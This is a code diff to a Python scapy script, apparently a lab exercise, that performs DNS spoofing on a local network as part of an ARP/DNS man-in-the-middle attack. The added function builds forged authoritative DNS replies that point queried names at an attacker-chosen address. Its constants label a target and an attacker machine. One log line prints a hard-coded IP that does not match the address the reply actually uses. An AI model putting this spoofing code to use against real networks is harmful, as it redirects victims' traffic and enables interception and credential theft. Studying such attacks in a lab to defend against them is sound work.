@@ -4,7 +4,9 @@ from scapy.layers.l2 import getmacbyip, Ether, ARP
 from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
 import scapy.all as scapy
 import time
+import random
 
+# Constants
 DOOFENSHMIRTZ_IP = "10.0.2.15"  # Enter the computer you attack's IP.
 SECRATERY_IP = "10.0.2.5"  # Enter the attacker's IP.
 NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
@@ -152,6 +154,24 @@ class DnsHandler(object):
         @param to ip address to return from the DNS lookup.
         @return fake DNS response to the request.
         """
+        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # Check if it's a DNS query
+            # Extract details from the query
+            query_name = pkt[DNSQR].qname
+            src_ip = pkt[IP].src
+            dst_ip = pkt[IP].dst
+            src_port = pkt[UDP].sport
+
+            print(f"Received DNS query for {query_name} from {src_ip}")
+
+            # Create DNS response
+            dns_response = IP(dst=src_ip, src=dst_ip) / \
+                           UDP(dport=src_port, sport=53) / \
+                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                               an=DNSRR(rrname=query_name, ttl=random.randint(16,23), rdata=to))  # Your IP
+
+            # Send the response
+            scapy.send(dns_response, verbose=0)
+            print(f"Sent DNS response to {src_ip} for {query_name} with IP 192.168.1.10")
 
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
